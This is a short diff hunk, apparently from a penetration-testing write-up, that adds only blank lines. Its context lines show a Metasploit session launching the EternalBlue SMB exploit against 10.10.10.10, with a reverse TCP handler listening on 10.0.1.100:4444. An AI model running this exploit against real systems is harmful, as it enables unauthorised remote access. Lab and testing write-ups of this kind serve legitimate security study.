@@ -25,3 +25,5 @@ msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
 [*] Started reverse TCP handler on 10.0.1.100:4444 
 [*] 10.10.10.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
 ```
+
+
